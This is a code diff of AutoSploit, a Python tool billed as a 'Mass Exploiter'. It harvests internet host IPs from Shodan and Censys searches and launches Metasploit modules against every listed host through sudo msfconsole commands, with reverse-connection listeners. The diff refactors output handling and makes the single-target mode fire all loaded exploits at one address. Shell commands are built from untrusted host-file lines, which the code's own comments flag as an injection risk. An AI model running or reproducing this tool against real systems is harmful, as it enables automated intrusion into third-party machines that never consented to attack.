@@ -13,7 +13,6 @@ TODO LIST:
  - Fix the non-existing host path reference line #409
  - Create a retry decorator with a max of 5 min of 3 line #436
  - Add a secondary check to make sure autosploit is running line #535
- -
 """
 
 import os
@@ -27,13 +26,21 @@ import censysSearch
 import shodan
 # idk if you're going to need this since retrying is a decorator (see line 410)
 # from retrying import retry
-from blessings import Terminal
 
 from lib.jsonize import load_exploits
 from lib.cmdline.cmd import AutoSploitParser
+from lib.settings import (
+    validate_ip_addr,
+    PLATFORM_PROMPT,
+    AUTOSPLOIT_PROMPT
+)
+from lib.output import (
+    info,
+    prompt,
+    error,
+    warning
+)
 
-
-t = Terminal()
 
 # Global vars
 api = ""
@@ -57,13 +64,13 @@ autosploit_opts = {
 def logo(line_sep="#--", space=" " * 30):
     """Logo."""
     global version
-    print(t.cyan("""{space_sep}_____     _       _____     _     _ _
+    print("""\033[1m\033[36m{space_sep}_____     _       _____     _     _ _
 {sep1}Author : Vector/NullArray |  _  |_ _| |_ ___|   __|___| |___|_| |_
 {sep1}Twitter: @Real__Vector    |     | | |  _| . |__   | . | | . | |  _|
 {sep1}Type   : Mass Exploiter   |__|__|___|_| |___|_____|  _|_|___|_|_|
 {sep1}Version: {v_num}                                    |_|
-##############################################
-""".format(sep1=line_sep, v_num=version, space_sep=space)))
+##############################################\033[0m
+""".format(sep1=line_sep, v_num=version, space_sep=space))
 
 
 def animation(text):
@@ -129,10 +136,8 @@ def exploit(query=None, single=None):
     if query is None:
         rhosts = single
 
-        print("\n[{}]Single target mode. All available modules "
-              "will be run against provided RHOST.".format(t.green("+")))
-        proceed = raw_input(
-            "[" + t.magenta("?") + "]Continue? [Y]es/[N]o: ").lower()
+        info("[{}]Single target mode. All available modules will be run against provided RHOST.")
+        proceed = prompt("Continue? [Y]es/[N]o")
 
         if proceed == 'y':
             thread = threading.Thread(
@@ -145,18 +150,17 @@ def exploit(query=None, single=None):
 
             stop_animation = True
 
-            print("\n\n\n[{}]Done. Launching exploits.".format(t.green("+")))
-            # TODO:/
-            # exploit is not referenced anywhere around here
-            template = "sudo msfconsole -x 'workspace -a %s; setg LHOST %s; setg LPORT %s; setg VERBOSE true; setg THREADS 100; set RHOSTS %s; %s'" % (
-                workspace, local_host, local_port, rhosts, exploit)
-            cmdline(template)
+            info("\n\n\nDone. Launching exploits.")
+            for _exploit in loaded_exploits:
+                template = "sudo msfconsole -x 'workspace -a %s; setg LHOST %s; setg LPORT %s; setg VERBOSE true; setg THREADS 100; set RHOSTS %s; %s'" % (
+                    workspace, local_host, local_port, rhosts, _exploit)
+                cmdline(template)
 
         elif proceed == 'n':
-            print("[{}]Aborted. Returning to Main Menu".format(t.red("!")))
+            error("Aborted. Returning to Main Menu")
 
         else:
-            print("[{}]Unhandled Option. Defaulting to Main Menu".format(t.red("!")))
+            warning("Unhandled Option. Defaulting to Main Menu")
 
     else:
 
@@ -171,35 +175,33 @@ def exploit(query=None, single=None):
 
         stop_animation = True
 
-    print("\n\n\n[{}]AutoSploit sorted the following MSF modules based search query relevance.\n".format(
-        t.green("+")))
+    info("AutoSploit sorted the following MSF modules based search query relevance.")
     # Print out the sorted modules
     for i, line in enumerate(sorted_modules, start=1):
-        print("[{}] {}".format(t.cyan(str(i)), line.strip()))
+        print("[\033[36m{}\033[0m] {}".format(str(i), line.strip()))
 
     # We'll give the user the option to run all modules in a 'hail mary' type of attack or allow
     # a more directed approach with the sorted modules.
-    choice = raw_input(
-        "\n[" + t.magenta("?") + "]Run sorted or all modules against targets? [S]orted/[A]ll: ").lower()
+    choice = prompt("Run sorted or all modules against targets? [S]orted/[A]ll")
 
     if choice == 's':
         with open("hosts.txt", "rb") as host_list:
             for rhosts in host_list:
-                for exploit in sorted_modules:
+                for _exploit in sorted_modules:
                     # WARNING: POTENTIAL SECURITY RISK - UNTRUSTED INPUT TO SHELL: (Fix by V1.5)
                     template = "sudo msfconsole -x 'workspace -a %s; setg LHOST %s; setg LPORT %s; setg VERBOSE true; setg THREADS 100; set RHOSTS %s; %s'" % (
-                        workspace, local_host, local_port, rhosts, exploit)
+                        workspace, local_host, local_port, rhosts,_exploit)
                     cmdline(template)
     elif choice == 'a':
         with open("hosts.txt", "rb") as host_list:
             for rhosts in host_list:
-                for exploit in all_modules:
+                for _exploit in all_modules:
                     # WARNING: POTENTIAL SECURITY RISK - UNTRUSTED INPUT TO SHELL: (Fix by V1.5)
                     template = "sudo msfconsole -x 'workspace -a %s; setg LHOST %s; setg LPORT %s; setg VERBOSE true; setg THREADS 100; set RHOSTS %s; %s'" % (
-                        workspace, local_host, local_port, rhosts, exploit)
+                        workspace, local_host, local_port, rhosts, _exploit)
                     cmdline(template)
     else:
-        print("[{}]Unhandled Option. Defaulting to Main Menu".format(t.red("!")))
+        warning("Unhandled Option. Defaulting to Main Menu")
 
 
 def settings(single=None):
@@ -212,45 +214,38 @@ def settings(single=None):
     print("\033[H\033[J")  # Clear terminal
     logo()
 
-    print(
-        "[{green}]Metasploit Settings:\n In order to proceed with the"
+    info(
+        "Metasploit Settings: In order to proceed with the"
         "exploit module some MSF settings need to be configured.\n"
-        "[{green}]Note.\nPlease make sure your Network is configured "
+        "Note.\nPlease make sure your Network is configured "
         "properly. In order to handle incoming Reverse Connections "
-        "your external Facing IP & Port need to be reachable.".format(
-            green=t.green("+"))
+        "your external Facing IP & Port need to be reachable."
     )
     time.sleep(3)
 
-    workspace = raw_input(
-        "\n[" + t.magenta("?") + "]Please set the Workspace name: ")
+    workspace = prompt("Please set the Workspace name", lowercase=False)
     if not workspace == "":
-        print("[{}]Workspace set to: {}".format(t.green("+"), workspace))
+        info("Workspace set to: {}".format(workspace))
     else:
         workspace = False
 
-    local_host = raw_input(
-        "\n[" + t.magenta("?") + "]Please set the local host: ")
+    local_host = prompt("Please set the local host", lowercase=False)
     if not local_host == "":
-        print("[{}]Local host set to: {}".format(
-            t.green("+"), repr(local_host)))
+        info("Local host set to: {}".format(repr(local_host)))
     else:
         local_host = False
 
-    local_port = raw_input(
-        "\n[" + t.magenta("?") + "]Please set the local port: ")
+    local_port = prompt("Please set the local port", lowercase=False)
     if not local_host == "":
-        print("[{}]Local port set to: {}".format(
-            t.green("+"), repr(local_port)))
+        info("Local port set to: {}".format(repr(local_port)))
     else:
         local_port = False
 
     # Check if settings are not null
     if workspace is False or local_host is False or local_port is False:
         configured = None
-        print(
-            "\n[{}]Warning. LPORT, LHOST and/or workspace cannot be null".format(t.red("!")))
-        print("[{}]Restarting MSF Settings module.".format(t.green("+")))
+        warning("Warning. LPORT, LHOST and/or workspace cannot be null")
+        info("Restarting MSF Settings module.")
         time.sleep(2)
     else:
         # If everything has been properly configured we're setting config var to true
@@ -265,16 +260,15 @@ def settings(single=None):
             # TEST print
 
         if not os.path.isfile("hosts.txt"):
-            print(
-                "[{}]Warning. AutoSploit failed to detect host file.".format(t.red("!")))
-            print(
-                "In order for the exploit module to work, a host file needs to be present.")
+            warning("Warning. AutoSploit failed to detect host file.")
+            print("In order for the exploit module to work, a host file needs to be present.")
         else:
             # Call exploit function, the 'query' argument contains the search strig provided
             # in the 'gather hosts' function. We will check this string against the MSF
             # modules in order to sort out the most relevant ones with regards to the intended
             # targets.
             exploit(query)
+
 
 def targets(clobber=True, hostLimit = -1):
     """Function to gather target host(s) from Shodan."""
@@ -284,27 +278,24 @@ def targets(clobber=True, hostLimit = -1):
     print("\033[H\033[J")  # Clear terminal
     logo()
 
-    print("[{}]Please provide your platform specific search query.".format(t.green("+")))
-    print("[{}]I.E. 'IIS' will return a list of IPs belonging to IIS servers.".format(
-        t.green("+")))
+    info("Please provide your platform specific search query.")
+    info("I.E. 'IIS' will return a list of IPs belonging to IIS servers.")
 
     while True:
-        query = raw_input("\n<" + t.cyan("PLATFORM") + ">$ ")
+        query = raw_input(PLATFORM_PROMPT)
         if query == "":
-            print("[{}]Query cannot be null.".format(t.red("!")))
+            error("[{}]Query cannot be null.")
         else:
             break
 
-    print("[{}]Please stand by while results are being collected...\n\n\n".format(
-        t.green("+")))
+    info("Please stand by while results are being collected...")
     time.sleep(1)
 
     try:
         result = api.search(query)
     except Exception as e:
-        print("\n[{}]Critical. An error was raised with the following error message.\n".format(
-            t.red("!")))
-        sys.exit()  # must use an integer with sys.exit()
+        error("Critical. An error was raised with the following error message. '{}'".format(str(e)))
+        sys.exit(1)
 
     thread = threading.Thread(target=animation, args=("collecting results", ))
     thread.daemon = True
@@ -325,9 +316,8 @@ def targets(clobber=True, hostLimit = -1):
             hostpath = os.path.abspath("hosts.txt")
             stop_animation = True
 
-
-        print("\n\n\n[{}]Done.".format(t.green("+")))
-        print("[{}]Host list saved to {}".format(t.green("+"), hostpath))
+        info("Done.")
+        info("Host list saved to {}".format(hostpath))
 
     else:
         with open("hosts.txt", "ab") as log:
@@ -335,14 +325,13 @@ def targets(clobber=True, hostLimit = -1):
                 time.sleep(0.1)
                 for service in result['matches']:
                     log.write(service['ip_str'])
-                    log.write("\n")
+                    log.write("")
 
         hostpath = os.path.abspath("hosts.txt")
         stop_animation = True
 
-    print("\n\n\n[{}]Done.".format(t.green("+")))
-    print("[{}]Hosts appended to list at ".format(t.green("+"), hostpath))
-
+    info("Done.")
+    info("Hosts appended to list at {}".format(hostpath))
 
 
 # TODO:/
@@ -357,8 +346,8 @@ def import_custom(clobber=True):
 
     custom_list = []
 
-    print("[{}]Please provide a path to your custom host list.".format(t.green("+")))
-    file_path = raw_input("\n[" + t.magenta("?") + "]Path to list: ")
+    info("Please provide a path to your custom host list.")
+    file_path = prompt("Path to list", lowercase=False)
 
     try:
         with open(file_path, "rb") as infile:
@@ -366,22 +355,24 @@ def import_custom(clobber=True):
                 custom_list.append(line.strip())
 
     except IOError as e:
-        print("\n[{}]Critical. An IO error was raised.".format(t.red("!")))
-        print("Please make sure to enter a valid path.")
+        error(
+            "An IOError was raised from provided path '{}' "
+            "make sure the path is correct and try again".format(str(e.message))
+        )
 
     if clobber:
-        print("[{}]Writing data to 'hosts.txt'...".format(t.green("+")))
+        info("Writing data to 'hosts.txt'...")
         with open('hosts.txt', 'wb') as outfile:
             for rhosts in custom_list:
                 outfile.write("{}{}".format(rhosts, os.linesep))
 
         hostpath = os.path.abspath("hosts.txt")
 
-        print("\n\n\n[{}]Done.".format(t.green("+")))
-        print("[{}]Host list saved to {}".format(t.green("+"), hostpath))
+        info("[{}]Done.")
+        info("Host list saved to {}".format(hostpath))
 
     else:
-        print("[{}]Appending data to 'hosts.txt'...".format(t.green("+")))
+        info("Appending data to 'hosts.txt'...")
 
     with open("hosts.txt", 'ab') as outfile:
         for rhosts in outfile:
@@ -389,8 +380,8 @@ def import_custom(clobber=True):
 
         hostpath = os.path.abspath("hosts.txt")
 
-        print("\n\n\n[{}]Done.".format(t.green("+")))
-        print("[{}]Host list saved to {}".format(t.green("+"), hostpath))
+        info("[{}]Done.")
+        info("Host list saved to {}".format(hostpath))
 
 
 def single_target():
@@ -405,47 +396,22 @@ def single_target():
     print("\033[H\033[J")  # Clear terminal
     logo()
 
-    print("[{}]Please provide a single IPv4.".format(t.green("+")))
-    IP = raw_input("[" + t.magenta("?") + "]IPv4 Address: ")
+    info("Please provide a single IPv4.")
+    IP = prompt("IPv4 Address", lowercase=False)
 
-    quartet1 = int(IP[0:IP.index('.')])
-    IP = IP[IP.index('.') + 1:]
-    quartet2 = int(IP[0:IP.index('.')])
-    IP = IP[IP.index('.') + 1:]
-    quartet3 = int(IP[0:IP.index('.')])
-    IP = IP[IP.index('.') + 1:]
-    quartet4 = int(IP)
+    if not validate_ip_addr(IP):
+        error("Provided IP address was not able to validated, try again")
 
-    IP = str(quartet1) + "." + str(quartet2) + "." + \
-        str(quartet3) + "." + str(quartet4)
-
-    if quartet1 < 0 or quartet1 > 255:
-        print("[{}]Critical. Invalid IPv4 address.".format(t.red("!")))
-    elif quartet2 < 0 or quartet2 > 255:
-        print("[{}]Critical. Invalid IPv4 address.".format(t.red("!")))
-    elif quartet3 < 0 or quartet3 > 255:
-        print("[{}]Critical. Invalid IPv4 address.".format(t.red("!")))
-    elif quartet4 < 0 or quartet4 > 255:
-        print("[{}]Critical. Invalid IPv4 address.".format(t.red("!")))
-    elif IP == "127.0.0.1":
-        print("[{}]Critical. Invalid IPv4 address.".format(t.red("!")))
-    else:
-        # TODO:/
-        # host path is not referenced anywhere near here
-        print("\n[{}]Host set to {}".format(t.green("+"), repr(hostpath)))
-        time.sleep(1)
-
-        print("\n\n[{}]Append the IP to the host file or pass to exploit module directly?.".format(
-            t.green("+")))
-        choice = raw_input(
-            "\n[" + t.magenta("?") + "]Append or Pass for immediate exploitation? [A/P]: ").lower()
+        info("Append the IP to the host file or pass to exploit module directly?.")
+        choice = prompt("Append or Pass for immediate exploitation? [A/P]")
 
         if choice == 'a':
             with open("hosts.txt", "ab") as outfile:
                 outfile.write(IP)
 
             hostpath = os.path.abspath("hosts.txt")
-            print("[{}]Host added to {}".format(t.green("+"), hostpath))
+            info("Host set to {}".format(repr(hostpath)))
+            time.sleep(1)
 
         elif choice == 'p':
             if configured:
@@ -454,7 +420,7 @@ def single_target():
                 settings(IP)
 
         else:
-            print("\n[{}]Unhandled Option.".format(t.red("!")))
+            warning("Unhandled Option.")
 
 
 def main():
@@ -471,10 +437,10 @@ def main():
     def try_shodan():
         try:
             api = shodan.Shodan(SHODAN_API_KEY)
-        except Exception as e:
-            print("\n[{}]Critical. API setup failed: {}\n".format(t.red("!"), e))
-            # sys.exit(e)
             return api
+        except Exception as e:
+            error("Critical. API setup failed with error '{}'".format(e))
+            # sys.exit(e)
 
     api = try_shodan()
     try:
@@ -486,52 +452,50 @@ def main():
             if configured is None:
                 settings()
 
-            print("\n[{}]Welcome to AutoSploit. Please select an action.".format(
-                t.green("+")))
+            info("Welcome to AutoSploit. Please select an action.")
             for i in autosploit_opts.keys():
                 print("{}. {}".format(i, autosploit_opts[i].title()))
 
-            action = raw_input("\n<" + t.cyan("AUTOSPLOIT") + ">$ ")
+            action = raw_input(AUTOSPLOIT_PROMPT)
 
             if action == '1':
                 usage()
             elif action == '2':
                 hostLimit = -1
-                limitYN = raw_input("\n[" + t.magenta("?") + "]Limit number of hosts? [y/n]: ").lower()
+                limitYN = prompt("Limit number of hosts? [y/n]")
                 if limitYN == 'y':
-                    hostLimit = input("\n[" + t.magenta("?") + "]How many?: ")
-                searchOption = input("\nSelect an option:\n1. Search Shodan\n2. Search Censys\n3. Search Shodan and Censys ")
+                    hostLimit = prompt("How many?", lowercase=False)
+                searchOption = raw_input(
+                    "Select an option:\n1. Search Shodan\n2. Search Censys\n3. Search Shodan and Censys\n"
+                )
                 if searchOption == 1:
                     if not os.path.isfile("hosts.txt"):
                         targets(True, hostLimit)
                     else:
-                        append = raw_input(
-                            "\n[" + t.magenta("?") + "]Append hosts to file or overwrite? [A/O]: ").lower()
+                        append = prompt("Append hosts to file or overwrite? [A/O]")
                         if append == 'a':
                             targets(False, hostLimit)
                         elif append == 'o':
                             targets(True, hostLimit)
                         else:
-                            print("\n[{}]Unhandled Option.".format(t.red("!")))
+                            error("Unhandled Option.")
                 elif searchOption == 2:
                     if not os.path.isfile("hosts.txt"):
                         censysSearch.censysTargets(True, hostLimit)
                     else:
-                        append = raw_input(
-                            "\n[" + t.magenta("?") + "]Append hosts to file or overwrite? [A/O]: ").lower()
+                        append = prompt("Append hosts to file or overwrite? [A/O]")
                         if append == 'a':
                             censysSearch.censysTargets(False, hostLimit)
                         elif append == 'o':
                             censysSearch.censysTargets(True, hostLimit)
                         else:
-                            print("\n[{}]Unhandled Option.".format(t.red("!")))
+                            warning("Unhandled Option.")
                 elif searchOption == 3:
                     if not os.path.isfile("hosts.txt"):
                         targets(True, hostLimit)
                         censysSearch.censysTargets(False, hostLimit)
                     else:
-                        append = raw_input(
-                            "\n[" + t.magenta("?") + "]Append hosts to file or overwrite? [A/O]: ").lower()
+                        append = prompt("Append hosts to file or overwrite? [A/O]")
                         if append == 'a':
                             targets(False, hostLimit)
                             censysSearch.censysTargets(False, hostLimit)
@@ -539,44 +503,41 @@ def main():
                             targets(True, hostLimit)
                             censysSearch.censysTargets(False, hostLimit)
                         else:
-                            print("\n[{}]Unhandled Option.".format(t.red("!")))
+                            warning("Unhandled Option.")
+
 
                 else:
-                    print("\n[{}]Unhandled Option.".format(t.red("!")))
-
+                    error("Unhandled Option.")
 
             elif action == '3':
                 if not os.path.isfile("hosts.txt"):
                     import_custom(True)
                 else:
-                    append = raw_input(
-                        "\n[" + t.magenta("?") + "]Append hosts to file or overwrite? [A/O]: ").lower()
+                    append = prompt("Append hosts to file or overwrite? [A/O]")
 
                     if append == 'a':
                         import_custom(False)
                     elif append == 'o':
                         import_custom(True)
                     else:
-                        print("\n[{}]Unhandled Option.".format(t.red("!")))
+                        warning("[{}]Unhandled Option.")
             elif action == '4':
                 single_target()
             elif action == '5':
                 if not os.path.isfile("hosts.txt"):
-                    print(
-                        "\n[{}]Warning. AutoSploit failed to detect host file.".format(t.red("!")))
+                    warning("Warning. AutoSploit failed to detect host file.")
                 else:
-                    print("[{}]Printing hosts...\n\n".format(t.green("+")))
+                    info("Printing hosts...")
                     time.sleep(2)
 
                     with open("hosts.txt", "rb") as infile:
                         for line in infile:
-                            print("[{}]{}".format(t.cyan("-"), line))
+                            print("[\033[36m-\033[0m]{}".format(line))
 
-                        print("\n[{}]Done.".format(t.green("+")))
+                        info("Done.")
             elif action == '6':
                 if not os.path.isfile("hosts.txt"):
-                    print(
-                        "\n[{}]Warning. AutoSploit failed to detect host file.".format(t.red("!")))
+                    warning("Warning. AutoSploit failed to detect host file.")
                     print("Please make sure to gather a list of targets")
                     print("by selecting the 'Gather Hosts' option")
                     print("before executing the 'Exploit' module.")
@@ -586,13 +547,13 @@ def main():
             elif configured is False:
                 settings()
             elif action == '99':
-                print("\n[{}]Exiting AutoSploit...".format(t.red("!")))
+                error("Exiting AutoSploit...")
                 return
             else:
-                print("\n[{}]Unhandled Option.".format(t.red("!")))
+                warning("Unhandled Option.")
 
     except KeyboardInterrupt:
-        print("\n[{}]Critical. User aborted.".format(t.red("!")))
+        error("Critical. User aborted.")
         sys.exit(0)
 
 
@@ -602,88 +563,77 @@ if __name__ == "__main__":
         opts = AutoSploitParser().optparser()
         AutoSploitParser().single_run_args(opts)
 
-
     logo()
 
-    print("[{}]Initializing AutoSploit...".format(t.green("+")))
-    print("[{}]One moment please while we check the Postgresql and Apache services...\n".format(
-        t.green("+")))
+    info("Initializing AutoSploit...")
+    info("One moment please while we check the Postgresql and Apache services...")
 
     postgresql = cmdline("sudo service postgresql status | grep active")
     if "Active: inactive" in postgresql:
-        print("\n[{}]Warning. Hueristics indicate Postgresql Service is offline".format(
-            t.red("!")))
+        warning("Warning. Heuristic tests have indicated PostgreSQL Service is offline")
 
-        start_pst = raw_input(
-            "\n[" + t.magenta("?") + "]Start Postgresql Service? [Y]es/[N]o: ").lower()
+        start_pst = prompt("Start Postgresql Service? [Y]es/[N]o")
         if start_pst == 'y':
             os.system("sudo service postgresql start")
-            print("[{}]Postgresql Service Started...".format(t.green("+")))
+            info("Postgresql Service Started...")
             time.sleep(1.5)
 
         elif start_pst == 'n':
-            print("\n[{}]AutoSploit's MSF related operations require this service to be active.".format(
-                t.red("!")))
-            print("[{}]Aborted.".format(t.red("!")))
+            error("AutoSploit's MSF related operations require this service to be active.")
+            error("Aborted.")
             time.sleep(1.5)
             sys.exit(0)
         else:
-            print("\n[{}]Unhandled Option. Defaulting to starting the service.".format(
-                t.red("!")))
+            warning("Unhandled Option. Defaulting to starting the service.")
             os.system("sudo service postgresql start")
 
-            print("[{}]Postgresql Service Started...".format(t.green("+")))
+            info("Postgresql Service Started...")
             time.sleep(1.5)
 
     apache = cmdline("service apache2 status | grep active")
     if "Active: inactive" in apache:
-        print("\n[{}]Warning. Hueristics indicate Apache Service is offline".format(
-            t.red("!")))
+        warning("Warning. Heruistic tests indicated that Apache Service is offline")
 
-        start_ap = raw_input(
-            "\n[" + t.magenta("?") + "]Start Apache Service? [Y]es/[N]o: ").lower()
+        start_ap = prompt("Start Apache Service? [Y]es/[N]o")
         if start_ap == 'y':
             os.system("sudo service apache2 start")
 
-            print("[{}]Apache2 Service Started...".format(t.green("+")))
+            info("[{}]Apache2 Service Started...")
             time.sleep(1.5)
 
         elif start_ap == 'n':
-            print("\n[{}]AutoSploit's MSF related operations require this service to be active.".format(
-                t.red("!")))
-            print("[{}]Aborted.".format(t.red("!")))
+            error("AutoSploit's MSF related operations require this service to be active.")
+            error("Aborted.")
             time.sleep(1.5)
             sys.exit(0)
         else:
-            print("\n[{}]Unhandled Option. Defaulting to starting the service.".format(
-                t.red("!")))
+            warning("Unhandled Option. Defaulting to starting the service.")
             os.system("sudo service apache2 start")
             # TODO:/
             # Should really add another check here to make sure it started,
             # possible to use `psutils` to check the running tasks for autosploit
 
-            print("[{}]Apache2 Service Started...".format(t.green("+")))
+            info("Apache2 Service Started...")
             time.sleep(1.5)
 
     # We will check if the shodan api key has been saved before, if not we are going to prompt
     # for it and save it to a file
     if not os.path.isfile("api.p"):
-        print("\n[{}]Please provide your Shodan.io API key.".format(t.green("+")))
+        info("Please provide your Shodan.io API key.")
 
-        SHODAN_API_KEY = raw_input("API key: ")
-        pickle.dump(SHODAN_API_KEY, open("api.p", "wb"))
+        SHODAN_API_KEY = prompt("API key", lowercase=False)
+        pickle.dump(SHODAN_API_KEY.strip(), open("api.p", "wb"))
         path = os.path.abspath("api.p")
-        print("[{}]\nYour API key has been saved to {}".format(t.green("+"), path))
+        info("Your API key has been saved to {}".format(path))
         main()
 
     else:
         try:
             SHODAN_API_KEY = pickle.load(open("api.p", "rb"))
         except IOError as e:
-            print("\n[{}]Critical. An IO error was raised while attempting to read API data.\n{}".format(
-                t.red("!"), e))
+            error("Critical. An IO error was raised while attempting to read API data. '{}'".format(str(e)))
 
         path = os.path.abspath("api.p")
-        print("\n[{}]Your API key was loaded from {}".format(t.green("+"), path))
+        info("Your API key was loaded from {}".format(path))
 
         main()
